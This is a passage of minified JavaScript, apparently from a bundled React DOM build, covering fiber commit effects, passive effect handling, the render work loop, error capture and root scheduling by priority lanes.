                } catch (Z) {
                  Ot(_, _.return, Z);
                }
              }
            } else if ((e.tag !== 22 && e.tag !== 23 || e.memoizedState === null || e === t) && e.child !== null) {
              e.child.return = e, e = e.child;
              continue;
            }
            if (e === t) break t;
            for (; e.sibling === null; ) {
              if (e.return === null || e.return === t) break t;
              n === e && (n = null), e = e.return;
            }
            n === e && (n = null), e.sibling.return = e.return, e = e.sibling;
          }
          l & 4 && (l = t.updateQueue, l !== null && (n = l.retryQueue, n !== null && (l.retryQueue = null, qi(t, n))));
          break;
        case 19:
          Ee(e, t), be(t), l & 4 && (l = t.updateQueue, l !== null && (t.updateQueue = null, qi(t, l)));
          break;
        case 30:
          break;
        case 21:
          break;
        default:
          Ee(e, t), be(t);
      }
    }
    function be(t) {
      var e = t.flags;
      if (e & 2) {
        try {
          for (var n, l = t.return; l !== null; ) {
            if (Ps(l)) {
              n = l;
              break;
            }
            l = l.return;
          }
          if (n == null) throw Error(c(160));
          switch (n.tag) {
            case 27:
              var a = n.stateNode, i = lr(t);
              Gi(t, i, a);
              break;
            case 5:
              var h = n.stateNode;
              n.flags & 32 && (au(h, ""), n.flags &= -33);
              var d = lr(t);
              Gi(t, d, h);
              break;
            case 3:
            case 4:
              var _ = n.stateNode.containerInfo, R = lr(t);
              ur(t, R, _);
              break;
            default:
              throw Error(c(161));
          }
        } catch (w) {
          Ot(t, t.return, w);
        }
        t.flags &= -3;
      }
      e & 4096 && (t.flags &= -4097);
    }
    function f1(t) {
      if (t.subtreeFlags & 1024) for (t = t.child; t !== null; ) {
        var e = t;
        f1(e), e.tag === 5 && e.flags & 1024 && e.stateNode.reset(), t = t.sibling;
      }
    }
    function Mn(t, e) {
      if (e.subtreeFlags & 8772) for (e = e.child; e !== null; ) e1(t, e.alternate, e), e = e.sibling;
    }
    function Xl(t) {
      for (t = t.child; t !== null; ) {
        var e = t;
        switch (e.tag) {
          case 0:
          case 11:
          case 14:
          case 15:
            el(4, e, e.return), Xl(e);
            break;
          case 1:
            rn(e, e.return);
            var n = e.stateNode;
            typeof n.componentWillUnmount == "function" && ks(e, e.return, n), Xl(e);
            break;
          case 27:
            za(e.stateNode);
          case 26:
          case 5:
            rn(e, e.return), Xl(e);
            break;
          case 22:
            e.memoizedState === null && Xl(e);
            break;
          case 30:
            Xl(e);
            break;
          default:
            Xl(e);
        }
        t = t.sibling;
      }
    }
    function Cn(t, e, n) {
      for (n = n && (e.subtreeFlags & 8772) !== 0, e = e.child; e !== null; ) {
        var l = e.alternate, a = t, i = e, h = i.flags;
        switch (i.tag) {
          case 0:
          case 11:
          case 15:
            Cn(a, i, n), Aa(4, i);
            break;
          case 1:
            if (Cn(a, i, n), l = i, a = l.stateNode, typeof a.componentDidMount == "function") try {
              a.componentDidMount();
            } catch (R) {
              Ot(l, l.return, R);
            }
            if (l = i, a = l.updateQueue, a !== null) {
              var d = l.stateNode;
              try {
                var _ = a.shared.hiddenCallbacks;
                if (_ !== null) for (a.shared.hiddenCallbacks = null, a = 0; a < _.length; a++) Yo(_[a], d);
              } catch (R) {
                Ot(l, l.return, R);
              }
            }
            n && h & 64 && Fs(i), Ta(i, i.return);
            break;
          case 27:
            Ws(i);
          case 26:
          case 5:
            Cn(a, i, n), n && l === null && h & 4 && $s(i), Ta(i, i.return);
            break;
          case 12:
            Cn(a, i, n);
            break;
          case 31:
            Cn(a, i, n), n && h & 4 && u1(a, i);
            break;
          case 13:
            Cn(a, i, n), n && h & 4 && a1(a, i);
            break;
          case 22:
            i.memoizedState === null && Cn(a, i, n), Ta(i, i.return);
            break;
          case 30:
            break;
          default:
            Cn(a, i, n);
        }
        e = e.sibling;
      }
    }
    function ir(t, e) {
      var n = null;
      t !== null && t.memoizedState !== null && t.memoizedState.cachePool !== null && (n = t.memoizedState.cachePool.pool), t = null, e.memoizedState !== null && e.memoizedState.cachePool !== null && (t = e.memoizedState.cachePool.pool), t !== n && (t != null && t.refCount++, n != null && ra(n));
    }
    function fr(t, e) {
      t = null, e.alternate !== null && (t = e.alternate.memoizedState.cache), e = e.memoizedState.cache, e !== t && (e.refCount++, t != null && ra(t));
    }
    function ln(t, e, n, l) {
      if (e.subtreeFlags & 10256) for (e = e.child; e !== null; ) c1(t, e, n, l), e = e.sibling;
    }
    function c1(t, e, n, l) {
      var a = e.flags;
      switch (e.tag) {
        case 0:
        case 11:
        case 15:
          ln(t, e, n, l), a & 2048 && Aa(9, e);
          break;
        case 1:
          ln(t, e, n, l);
          break;
        case 3:
          ln(t, e, n, l), a & 2048 && (t = null, e.alternate !== null && (t = e.alternate.memoizedState.cache), e = e.memoizedState.cache, e !== t && (e.refCount++, t != null && ra(t)));
          break;
        case 12:
          if (a & 2048) {
            ln(t, e, n, l), t = e.stateNode;
            try {
              var i = e.memoizedProps, h = i.id, d = i.onPostCommit;
              typeof d == "function" && d(h, e.alternate === null ? "mount" : "update", t.passiveEffectDuration, -0);
            } catch (_) {
              Ot(e, e.return, _);
            }
          } else ln(t, e, n, l);
          break;
        case 31:
          ln(t, e, n, l);
          break;
        case 13:
          ln(t, e, n, l);
          break;
        case 23:
          break;
        case 22:
          i = e.stateNode, h = e.alternate, e.memoizedState !== null ? i._visibility & 2 ? ln(t, e, n, l) : Sa(t, e) : i._visibility & 2 ? ln(t, e, n, l) : (i._visibility |= 2, Uu(t, e, n, l, (e.subtreeFlags & 10256) !== 0 || false)), a & 2048 && ir(h, e);
          break;
        case 24:
          ln(t, e, n, l), a & 2048 && fr(e.alternate, e);
          break;
        default:
          ln(t, e, n, l);
      }
    }
    function Uu(t, e, n, l, a) {
      for (a = a && ((e.subtreeFlags & 10256) !== 0 || false), e = e.child; e !== null; ) {
        var i = t, h = e, d = n, _ = l, R = h.flags;
        switch (h.tag) {
          case 0:
          case 11:
          case 15:
            Uu(i, h, d, _, a), Aa(8, h);
            break;
          case 23:
            break;
          case 22:
            var w = h.stateNode;
            h.memoizedState !== null ? w._visibility & 2 ? Uu(i, h, d, _, a) : Sa(i, h) : (w._visibility |= 2, Uu(i, h, d, _, a)), a && R & 2048 && ir(h.alternate, h);
            break;
          case 24:
            Uu(i, h, d, _, a), a && R & 2048 && fr(h.alternate, h);
            break;
          default:
            Uu(i, h, d, _, a);
        }
        e = e.sibling;
      }
    }
    function Sa(t, e) {
      if (e.subtreeFlags & 10256) for (e = e.child; e !== null; ) {
        var n = t, l = e, a = l.flags;
        switch (l.tag) {
          case 22:
            Sa(n, l), a & 2048 && ir(l.alternate, l);
            break;
          case 24:
            Sa(n, l), a & 2048 && fr(l.alternate, l);
            break;
          default:
            Sa(n, l);
        }
        e = e.sibling;
      }
    }
    var Ua = 8192;
    function xu(t, e, n) {
      if (t.subtreeFlags & Ua) for (t = t.child; t !== null; ) r1(t, e, n), t = t.sibling;
    }
    function r1(t, e, n) {
      switch (t.tag) {
        case 26:
          xu(t, e, n), t.flags & Ua && t.memoizedState !== null && sm(n, nn, t.memoizedState, t.memoizedProps);
          break;
        case 5:
          xu(t, e, n);
          break;
        case 3:
        case 4:
          var l = nn;
          nn = tf(t.stateNode.containerInfo), xu(t, e, n), nn = l;
          break;
        case 22:
          t.memoizedState === null && (l = t.alternate, l !== null && l.memoizedState !== null ? (l = Ua, Ua = 16777216, xu(t, e, n), Ua = l) : xu(t, e, n));
          break;
        default:
          xu(t, e, n);
      }
    }
    function o1(t) {
      var e = t.alternate;
      if (e !== null && (t = e.child, t !== null)) {
        e.child = null;
        do
          e = t.sibling, t.sibling = null, t = e;
        while (t !== null);
      }
    }
    function xa(t) {
      var e = t.deletions;
      if ((t.flags & 16) !== 0) {
        if (e !== null) for (var n = 0; n < e.length; n++) {
          var l = e[n];
          ue = l, h1(l, t);
        }
        o1(t);
      }
      if (t.subtreeFlags & 10256) for (t = t.child; t !== null; ) s1(t), t = t.sibling;
    }
    function s1(t) {
      switch (t.tag) {
        case 0:
        case 11:
        case 15:
          xa(t), t.flags & 2048 && el(9, t, t.return);
          break;
        case 3:
          xa(t);
          break;
        case 12:
          xa(t);
          break;
        case 22:
          var e = t.stateNode;
          t.memoizedState !== null && e._visibility & 2 && (t.return === null || t.return.tag !== 13) ? (e._visibility &= -3, ji(t)) : xa(t);
          break;
        default:
          xa(t);
      }
    }
    function ji(t) {
      var e = t.deletions;
      if ((t.flags & 16) !== 0) {
        if (e !== null) for (var n = 0; n < e.length; n++) {
          var l = e[n];
          ue = l, h1(l, t);
        }
        o1(t);
      }
      for (t = t.child; t !== null; ) {
        switch (e = t, e.tag) {
          case 0:
          case 11:
          case 15:
            el(8, e, e.return), ji(e);
            break;
          case 22:
            n = e.stateNode, n._visibility & 2 && (n._visibility &= -3, ji(e));
            break;
          default:
            ji(e);
        }
        t = t.sibling;
      }
    }
    function h1(t, e) {
      for (; ue !== null; ) {
        var n = ue;
        switch (n.tag) {
          case 0:
          case 11:
          case 15:
            el(8, n, e);
            break;
          case 23:
          case 22:
            if (n.memoizedState !== null && n.memoizedState.cachePool !== null) {
              var l = n.memoizedState.cachePool.pool;
              l != null && l.refCount++;
            }
            break;
          case 24:
            ra(n.memoizedState.cache);
        }
        if (l = n.child, l !== null) l.return = n, ue = l;
        else t: for (n = t; ue !== null; ) {
          l = ue;
          var a = l.sibling, i = l.return;
          if (n1(l), l === n) {
            ue = null;
            break t;
          }
          if (a !== null) {
            a.return = i, ue = a;
            break t;
          }
          ue = i;
        }
      }
    }
    var x2 = {
      getCacheForType: function(t) {
        var e = ce(Ft), n = e.data.get(t);
        return n === void 0 && (n = t(), e.data.set(t, n)), n;
      },
      cacheSignal: function() {
        return ce(Ft).controller.signal;
      }
    }, O2 = typeof WeakMap == "function" ? WeakMap : Map, At = 0, Ct = null, st = null, dt = 0, xt = 0, De = null, nl = false, Ou = false, cr = false, wn = 0, Qt = 0, ll = 0, Kl = 0, rr = 0, Be = 0, Nu = 0, Oa = null, _e = null, or = false, Xi = 0, d1 = 0, Ki = 1 / 0, Qi = null, ul = null, Wt = 0, al = null, Ru = null, Hn = 0, sr = 0, hr = null, y1 = null, Na = 0, dr = null;
    function ze() {
      return (At & 2) !== 0 && dt !== 0 ? dt & -dt : H.T !== null ? Er() : R0();
    }
    function m1() {
      if (Be === 0) if ((dt & 536870912) === 0 || gt) {
        var t = Et;
        Et <<= 1, (Et & 3932160) === 0 && (Et = 262144), Be = t;
      } else Be = 536870912;
      return t = Ne.current, t !== null && (t.flags |= 32), Be;
    }
    function Ae(t, e, n) {
      (t === Ct && (xt === 2 || xt === 9) || t.cancelPendingCommit !== null) && (Du(t, 0), il(t, dt, Be, false)), Fu(t, n), ((At & 2) === 0 || t !== Ct) && (t === Ct && ((At & 2) === 0 && (Kl |= n), Qt === 4 && il(t, dt, Be, false)), on(t));
    }
    function g1(t, e, n) {
      if ((At & 6) !== 0) throw Error(c(327));
      var l = !n && (e & 127) === 0 && (e & t.expiredLanes) === 0 || Ju(t, e), a = l ? D2(t, e) : mr(t, e, true), i = l;
      do {
        if (a === 0) {
          Ou && !l && il(t, e, 0, false);
          break;
        } else {
          if (n = t.current.alternate, i && !N2(n)) {
            a = mr(t, e, false), i = false;
            continue;
          }
          if (a === 2) {
            if (i = e, t.errorRecoveryDisabledLanes & i) var h = 0;
            else h = t.pendingLanes & -536870913, h = h !== 0 ? h : h & 536870912 ? 536870912 : 0;
            if (h !== 0) {
              e = h;
              t: {
                var d = t;
                a = Oa;
                var _ = d.current.memoizedState.isDehydrated;
                if (_ && (Du(d, h).flags |= 256), h = mr(d, h, false), h !== 2) {
                  if (cr && !_) {
                    d.errorRecoveryDisabledLanes |= i, Kl |= i, a = 4;
                    break t;
                  }
                  i = _e, _e = a, i !== null && (_e === null ? _e = i : _e.push.apply(_e, i));
                }
                a = h;
              }
              if (i = false, a !== 2) continue;
            }
          }
          if (a === 1) {
            Du(t, 0), il(t, e, 0, true);
            break;
          }
          t: {
            switch (l = t, i = a, i) {
              case 0:
              case 1:
                throw Error(c(345));
              case 4:
                if ((e & 4194048) !== e) break;
              case 6:
                il(l, e, Be, !nl);
                break t;
              case 2:
                _e = null;
                break;
              case 3:
              case 5:
                break;
              default:
                throw Error(c(329));
            }
            if ((e & 62914560) === e && (a = Xi + 300 - ne(), 10 < a)) {
              if (il(l, e, Be, !nl), ti(l, 0, true) !== 0) break t;
              Hn = e, l.timeoutHandle = I1(v1.bind(null, l, n, _e, Qi, or, e, Be, Kl, Nu, nl, i, "Throttled", -0, 0), a);
              break t;
            }
            v1(l, n, _e, Qi, or, e, Be, Kl, Nu, nl, i, null, -0, 0);
          }
        }
        break;
      } while (true);
      on(t);
    }
    function v1(t, e, n, l, a, i, h, d, _, R, w, Y, D, M) {
      if (t.timeoutHandle = -1, Y = e.subtreeFlags, Y & 8192 || (Y & 16785408) === 16785408) {
        Y = {
          stylesheets: null,
          count: 0,
          imgCount: 0,
          imgBytes: 0,
          suspenseyImages: [],
          waitingForImages: true,
          waitingForViewTransition: false,
          unsuspend: _n
        }, r1(e, i, Y);
        var Z = (i & 62914560) === i ? Xi - ne() : (i & 4194048) === i ? d1 - ne() : 0;
        if (Z = hm(Y, Z), Z !== null) {
          Hn = i, t.cancelPendingCommit = Z(U1.bind(null, t, e, i, n, l, a, h, d, _, w, Y, null, D, M)), il(t, i, h, !R);
          return;
        }
      }
      U1(t, e, i, n, l, a, h, d, _);
    }
    function N2(t) {
      for (var e = t; ; ) {
        var n = e.tag;
        if ((n === 0 || n === 11 || n === 15) && e.flags & 16384 && (n = e.updateQueue, n !== null && (n = n.stores, n !== null))) for (var l = 0; l < n.length; l++) {
          var a = n[l], i = a.getSnapshot;
          a = a.value;
          try {
            if (!xe(i(), a)) return false;
          } catch {
            return false;
          }
        }
        if (n = e.child, e.subtreeFlags & 16384 && n !== null) n.return = e, e = n;
        else {
          if (e === t) break;
          for (; e.sibling === null; ) {
            if (e.return === null || e.return === t) return true;
            e = e.return;
          }
          e.sibling.return = e.return, e = e.sibling;
        }
      }
      return true;
    }
    function il(t, e, n, l) {
      e &= ~rr, e &= ~Kl, t.suspendedLanes |= e, t.pingedLanes &= ~e, l && (t.warmLanes |= e), l = t.expirationTimes;
      for (var a = e; 0 < a; ) {
        var i = 31 - C(a), h = 1 << i;
        l[i] = -1, a &= ~h;
      }
      n !== 0 && x0(t, n, e);
    }
    function Vi() {
      return (At & 6) === 0 ? (Ra(0), false) : true;
    }
    function yr() {
      if (st !== null) {
        if (xt === 0) var t = st.return;
        else t = st, Un = Cl = null, Dc(t), bu = null, sa = 0, t = st;
        for (; t !== null; ) Js(t.alternate, t), t = t.return;
        st = null;
      }
    }
    function Du(t, e) {
      var n = t.timeoutHandle;
      n !== -1 && (t.timeoutHandle = -1, J2(n)), n = t.cancelPendingCommit, n !== null && (t.cancelPendingCommit = null, n()), Hn = 0, yr(), Ct = t, st = n = Tn(t.current, null), dt = e, xt = 0, De = null, nl = false, Ou = Ju(t, e), cr = false, Nu = Be = rr = Kl = ll = Qt = 0, _e = Oa = null, or = false, (e & 8) !== 0 && (e |= e & 32);
      var l = t.entangledLanes;
      if (l !== 0) for (t = t.entanglements, l &= e; 0 < l; ) {
        var a = 31 - C(l), i = 1 << a;
        e |= t[a], l &= ~i;
      }
      return wn = e, hi(), n;
    }
    function p1(t, e) {
      et = null, H.H = Ea, e === Eu || e === bi ? (e = Co(), xt = 3) : e === pc ? (e = Co(), xt = 4) : xt = e === Zc ? 8 : e !== null && typeof e == "object" && typeof e.then == "function" ? 6 : 1, De = e, st === null && (Qt = 1, Ci(t, Ge(e, t.current)));
    }
    function E1() {
      var t = Ne.current;
      return t === null ? true : (dt & 4194048) === dt ? Ke === null : (dt & 62914560) === dt || (dt & 536870912) !== 0 ? t === Ke : false;
    }
    function b1() {
      var t = H.H;
      return H.H = Ea, t === null ? Ea : t;
    }
    function _1() {
      var t = H.A;
      return H.A = x2, t;
    }
    function Zi() {
      Qt = 4, nl || (dt & 4194048) !== dt && Ne.current !== null || (Ou = true), (ll & 134217727) === 0 && (Kl & 134217727) === 0 || Ct === null || il(Ct, dt, Be, false);
    }
    function mr(t, e, n) {
      var l = At;
      At |= 2;
      var a = b1(), i = _1();
      (Ct !== t || dt !== e) && (Qi = null, Du(t, e)), e = false;
      var h = Qt;
      t: do
        try {
          if (xt !== 0 && st !== null) {
            var d = st, _ = De;
            switch (xt) {
              case 8:
                yr(), h = 6;
                break t;
              case 3:
              case 2:
              case 9:
              case 6:
                Ne.current === null && (e = true);
                var R = xt;
                if (xt = 0, De = null, Bu(t, d, _, R), n && Ou) {
                  h = 0;
                  break t;
                }
                break;
              default:
                R = xt, xt = 0, De = null, Bu(t, d, _, R);
            }
          }
          R2(), h = Qt;
          break;
        } catch (w) {
          p1(t, w);
        }
      while (true);
      return e && t.shellSuspendCounter++, Un = Cl = null, At = l, H.H = a, H.A = i, st === null && (Ct = null, dt = 0, hi()), h;
    }
    function R2() {
      for (; st !== null; ) A1(st);
    }
    function D2(t, e) {
      var n = At;
      At |= 2;
      var l = b1(), a = _1();
      Ct !== t || dt !== e ? (Qi = null, Ki = ne() + 500, Du(t, e)) : Ou = Ju(t, e);
      t: do
        try {
          if (xt !== 0 && st !== null) {
            e = st;
            var i = De;
            e: switch (xt) {
              case 1:
                xt = 0, De = null, Bu(t, e, i, 1);
                break;
              case 2:
              case 9:
                if (zo(i)) {
                  xt = 0, De = null, T1(e);
                  break;
                }
                e = function() {
                  xt !== 2 && xt !== 9 || Ct !== t || (xt = 7), on(t);
                }, i.then(e, e);
                break t;
              case 3:
                xt = 7;
                break t;
              case 4:
                xt = 5;
                break t;
              case 7:
                zo(i) ? (xt = 0, De = null, T1(e)) : (xt = 0, De = null, Bu(t, e, i, 7));
                break;
              case 5:
                var h = null;
                switch (st.tag) {
                  case 26:
                    h = st.memoizedState;
                  case 5:
                  case 27:
                    var d = st;
                    if (h ? ch(h) : d.stateNode.complete) {
                      xt = 0, De = null;
                      var _ = d.sibling;
                      if (_ !== null) st = _;
                      else {
                        var R = d.return;
                        R !== null ? (st = R, Ii(R)) : st = null;
                      }
                      break e;
                    }
                }
                xt = 0, De = null, Bu(t, e, i, 5);
                break;
              case 6:
                xt = 0, De = null, Bu(t, e, i, 6);
                break;
              case 8:
                yr(), Qt = 6;
                break t;
              default:
                throw Error(c(462));
            }
          }
          B2();
          break;
        } catch (w) {
          p1(t, w);
        }
      while (true);
      return Un = Cl = null, H.H = l, H.A = a, At = n, st !== null ? 0 : (Ct = null, dt = 0, hi(), Qt);
    }
    function B2() {
      for (; st !== null && !Rf(); ) A1(st);
    }
    function A1(t) {
      var e = Zs(t.alternate, t, wn);
      t.memoizedProps = t.pendingProps, e === null ? Ii(t) : st = e;
    }
    function T1(t) {
      var e = t, n = e.alternate;
      switch (e.tag) {
        case 15:
        case 0:
          e = qs(n, e, e.pendingProps, e.type, void 0, dt);
          break;
        case 11:
          e = qs(n, e, e.pendingProps, e.type.render, e.ref, dt);
          break;
        case 5:
          Dc(e);
        default:
          Js(n, e), e = st = _o(e, wn), e = Zs(n, e, wn);
      }
      t.memoizedProps = t.pendingProps, e === null ? Ii(t) : st = e;
    }
    function Bu(t, e, n, l) {
      Un = Cl = null, Dc(e), bu = null, sa = 0;
      var a = e.return;
      try {
        if (E2(t, a, e, n, dt)) {
          Qt = 1, Ci(t, Ge(n, t.current)), st = null;
          return;
        }
      } catch (i) {
        if (a !== null) throw st = a, i;
        Qt = 1, Ci(t, Ge(n, t.current)), st = null;
        return;
      }
      e.flags & 32768 ? (gt || l === 1 ? t = true : Ou || (dt & 536870912) !== 0 ? t = false : (nl = t = true, (l === 2 || l === 9 || l === 3 || l === 6) && (l = Ne.current, l !== null && l.tag === 13 && (l.flags |= 16384))), S1(e, t)) : Ii(e);
    }
    function Ii(t) {
      var e = t;
      do {
        if ((e.flags & 32768) !== 0) {
          S1(e, nl);
          return;
        }
        t = e.return;
        var n = A2(e.alternate, e, wn);
        if (n !== null) {
          st = n;
          return;
        }
        if (e = e.sibling, e !== null) {
          st = e;
          return;
        }
        st = e = t;
      } while (e !== null);
      Qt === 0 && (Qt = 5);
    }
    function S1(t, e) {
      do {
        var n = T2(t.alternate, t);
        if (n !== null) {
          n.flags &= 32767, st = n;
          return;
        }
        if (n = t.return, n !== null && (n.flags |= 32768, n.subtreeFlags = 0, n.deletions = null), !e && (t = t.sibling, t !== null)) {
          st = t;
          return;
        }
        st = t = n;
      } while (t !== null);
      Qt = 6, st = null;
    }
    function U1(t, e, n, l, a, i, h, d, _) {
      t.cancelPendingCommit = null;
      do
        Ji();
      while (Wt !== 0);
      if ((At & 6) !== 0) throw Error(c(327));
      if (e !== null) {
        if (e === t.current) throw Error(c(177));
        if (i = e.lanes | e.childLanes, i |= lc, oy(t, n, i, h, d, _), t === Ct && (st = Ct = null, dt = 0), Ru = e, al = t, Hn = n, sr = i, hr = a, y1 = l, (e.subtreeFlags & 10256) !== 0 || (e.flags & 10256) !== 0 ? (t.callbackNode = null, t.callbackPriority = 0, w2(Ue, function() {
          return D1(), null;
        })) : (t.callbackNode = null, t.callbackPriority = 0), l = (e.flags & 13878) !== 0, (e.subtreeFlags & 13878) !== 0 || l) {
          l = H.T, H.T = null, a = K.p, K.p = 2, h = At, At |= 4;
          try {
            S2(t, e, n);
          } finally {
            At = h, K.p = a, H.T = l;
          }
        }
        Wt = 1, x1(), O1(), N1();
      }
    }
    function x1() {
      if (Wt === 1) {
        Wt = 0;
        var t = al, e = Ru, n = (e.flags & 13878) !== 0;
        if ((e.subtreeFlags & 13878) !== 0 || n) {
          n = H.T, H.T = null;
          var l = K.p;
          K.p = 2;
          var a = At;
          At |= 4;
          try {
            i1(e, t);
            var i = Or, h = so(t.containerInfo), d = i.focusedElem, _ = i.selectionRange;
            if (h !== d && d && d.ownerDocument && oo(d.ownerDocument.documentElement, d)) {
              if (_ !== null && Pf(d)) {
                var R = _.start, w = _.end;
                if (w === void 0 && (w = R), "selectionStart" in d) d.selectionStart = R, d.selectionEnd = Math.min(w, d.value.length);
                else {
                  var Y = d.ownerDocument || document, D = Y && Y.defaultView || window;
                  if (D.getSelection) {
                    var M = D.getSelection(), Z = d.textContent.length, W = Math.min(_.start, Z), Dt = _.end === void 0 ? W : Math.min(_.end, Z);
                    !M.extend && W > Dt && (h = Dt, Dt = W, W = h);
                    var O = ro(d, W), T = ro(d, Dt);
                    if (O && T && (M.rangeCount !== 1 || M.anchorNode !== O.node || M.anchorOffset !== O.offset || M.focusNode !== T.node || M.focusOffset !== T.offset)) {
                      var N = Y.createRange();
                      N.setStart(O.node, O.offset), M.removeAllRanges(), W > Dt ? (M.addRange(N), M.extend(T.node, T.offset)) : (N.setEnd(T.node, T.offset), M.addRange(N));
                    }
                  }
                }
              }
              for (Y = [], M = d; M = M.parentNode; ) M.nodeType === 1 && Y.push({
                element: M,
                left: M.scrollLeft,
                top: M.scrollTop
              });
              for (typeof d.focus == "function" && d.focus(), d = 0; d < Y.length; d++) {
                var L = Y[d];
                L.element.scrollLeft = L.left, L.element.scrollTop = L.top;
              }
            }
            ff = !!xr, Or = xr = null;
          } finally {
            At = a, K.p = l, H.T = n;
          }
        }
        t.current = e, Wt = 2;
      }
    }
    function O1() {
      if (Wt === 2) {
        Wt = 0;
        var t = al, e = Ru, n = (e.flags & 8772) !== 0;
        if ((e.subtreeFlags & 8772) !== 0 || n) {
          n = H.T, H.T = null;
          var l = K.p;
          K.p = 2;
          var a = At;
          At |= 4;
          try {
            e1(t, e.alternate, e);
          } finally {
            At = a, K.p = l, H.T = n;
          }
        }
        Wt = 3;
      }
    }
    function N1() {
      if (Wt === 4 || Wt === 3) {
        Wt = 0, $a();
        var t = al, e = Ru, n = Hn, l = y1;
        (e.subtreeFlags & 10256) !== 0 || (e.flags & 10256) !== 0 ? Wt = 5 : (Wt = 0, Ru = al = null, R1(t, t.pendingLanes));
        var a = t.pendingLanes;
        if (a === 0 && (ul = null), Mf(n), e = e.stateNode, S && typeof S.onCommitFiberRoot == "function") try {
          S.onCommitFiberRoot(g, e, void 0, (e.current.flags & 128) === 128);
        } catch {
        }
        if (l !== null) {
          e = H.T, a = K.p, K.p = 2, H.T = null;
          try {
            for (var i = t.onRecoverableError, h = 0; h < l.length; h++) {
              var d = l[h];
              i(d.value, {
                componentStack: d.stack
              });
            }
          } finally {
            H.T = e, K.p = a;
          }
        }
        (Hn & 3) !== 0 && Ji(), on(t), a = t.pendingLanes, (n & 261930) !== 0 && (a & 42) !== 0 ? t === dr ? Na++ : (Na = 0, dr = t) : Na = 0, Ra(0);
      }
    }
    function R1(t, e) {
      (t.pooledCacheLanes &= e) === 0 && (e = t.pooledCache, e != null && (t.pooledCache = null, ra(e)));
    }
    function Ji() {
      return x1(), O1(), N1(), D1();
    }
    function D1() {
      if (Wt !== 5) return false;
      var t = al, e = sr;
      sr = 0;
      var n = Mf(Hn), l = H.T, a = K.p;
      try {
        K.p = 32 > n ? 32 : n, H.T = null, n = hr, hr = null;
        var i = al, h = Hn;
        if (Wt = 0, Ru = al = null, Hn = 0, (At & 6) !== 0) throw Error(c(331));
        var d = At;
        if (At |= 4, s1(i.current), c1(i, i.current, h, n), At = d, Ra(0, false), S && typeof S.onPostCommitFiberRoot == "function") try {
          S.onPostCommitFiberRoot(g, i);
        } catch {
        }
        return true;
      } finally {
        K.p = a, H.T = l, R1(t, e);
      }
    }
    function B1(t, e, n) {
      e = Ge(n, e), e = Vc(t.stateNode, e, 2), t = Pn(t, e, 2), t !== null && (Fu(t, 2), on(t));
    }
    function Ot(t, e, n) {
      if (t.tag === 3) B1(t, t, n);
      else for (; e !== null; ) {
        if (e.tag === 3) {
          B1(e, t, n);
          break;
        } else if (e.tag === 1) {
          var l = e.stateNode;
          if (typeof e.type.getDerivedStateFromError == "function" || typeof l.componentDidCatch == "function" && (ul === null || !ul.has(l))) {
            t = Ge(n, t), n = zs(2), l = Pn(e, n, 2), l !== null && (Ms(n, l, e, t), Fu(l, 2), on(l));
            break;
          }
        }
        e = e.return;
      }
    }
    function gr(t, e, n) {
      var l = t.pingCache;
      if (l === null) {
        l = t.pingCache = new O2();
        var a = /* @__PURE__ */ new Set();
        l.set(e, a);
      } else a = l.get(e), a === void 0 && (a = /* @__PURE__ */ new Set(), l.set(e, a));
      a.has(n) || (cr = true, a.add(n), t = z2.bind(null, t, e, n), e.then(t, t));
    }
    function z2(t, e, n) {
      var l = t.pingCache;
      l !== null && l.delete(e), t.pingedLanes |= t.suspendedLanes & n, t.warmLanes &= ~n, Ct === t && (dt & n) === n && (Qt === 4 || Qt === 3 && (dt & 62914560) === dt && 300 > ne() - Xi ? (At & 2) === 0 && Du(t, 0) : rr |= n, Nu === dt && (Nu = 0)), on(t);
    }
    function z1(t, e) {
      e === 0 && (e = U0()), t = Bl(t, e), t !== null && (Fu(t, e), on(t));
    }
    function M2(t) {
      var e = t.memoizedState, n = 0;
      e !== null && (n = e.retryLane), z1(t, n);
    }
    function C2(t, e) {
      var n = 0;
      switch (t.tag) {
        case 31:
        case 13:
          var l = t.stateNode, a = t.memoizedState;
          a !== null && (n = a.retryLane);
          break;
        case 19:
          l = t.stateNode;
          break;
        case 22:
          l = t.stateNode._retryCache;
          break;
        default:
          throw Error(c(314));
      }
      l !== null && l.delete(e), z1(t, n);
    }
    function w2(t, e) {
      return Ul(t, e);
    }
    var Fi = null, zu = null, vr = false, ki = false, pr = false, fl = 0;
    function on(t) {
      t !== zu && t.next === null && (zu === null ? Fi = zu = t : zu = zu.next = t), ki = true, vr || (vr = true, L2());
    }
    function Ra(t, e) {
      if (!pr && ki) {
        pr = true;
        do
          for (var n = false, l = Fi; l !== null; ) {
            if (t !== 0) {
              var a = l.pendingLanes;
              if (a === 0) var i = 0;
              else {
                var h = l.suspendedLanes, d = l.pingedLanes;
                i = (1 << 31 - C(42 | t) + 1) - 1, i &= a & ~(h & ~d), i = i & 201326741 ? i & 201326741 | 1 : i ? i | 2 : 0;
              }
              i !== 0 && (n = true, H1(l, i));
            } else i = dt, i = ti(l, l === Ct ? i : 0, l.cancelPendingCommit !== null || l.timeoutHandle !== -1), (i & 3) === 0 || Ju(l, i) || (n = true, H1(l, i));
            l = l.next;
          }
        while (n);
        pr = false;
      }
    }
    function H2() {
      M1();
    }
    function M1() {
      ki = vr = false;
      var t = 0;
      fl !== 0 && I2() && (t = fl);
      for (var e = ne(), n = null, l = Fi; l !== null; ) {
        var a = l.next, i = C1(l, e);
        i === 0 ? (l.next = null, n === null ? Fi = a : n.next = a, a === null && (zu = n)) : (n = l, (t !== 0 || (i & 3) !== 0) && (ki = true)), l = a;
      }
      Wt !== 0 && Wt !== 5 || Ra(t), fl !== 0 && (fl = 0);
    }
    function C1(t, e) {
      for (var n = t.suspendedLanes, l = t.pingedLanes, a = t.expirationTimes, i = t.pendingLanes & -62914561; 0 < i; ) {
        var h = 31 - C(i), d = 1 << h, _ = a[h];
        _ === -1 ? ((d & n) === 0 || (d & l) !== 0) && (a[h] = ry(d, e)) : _ <= e && (t.expiredLanes |= d), i &= ~d;
      }
      if (e = Ct, n = dt, n = ti(t, t === e ? n : 0, t.cancelPendingCommit !== null || t.timeoutHandle !== -1), l = t.callbackNode, n === 0 || t === e && (xt === 2 || xt === 9) || t.cancelPendingCommit !== null) return l !== null && l !== null && Iu(l), t.callbackNode = null, t.callbackPriority = 0;
      if ((n & 3) === 0 || Ju(t, n)) {
        if (e = n & -n, e === t.callbackPriority) return e;
        switch (l !== null && Iu(l), Mf(n)) {
          case 2:
          case 8:
            n = Pa;
            break;
          case 32:
            n = Ue;
            break;
          case 268435456:
            n = y;
            break;
          default:
            n = Ue;
        }
        return l = w1.bind(null, t), n = Ul(n, l), t.callbackPriority = e, t.callbackNode = n, e;
      }
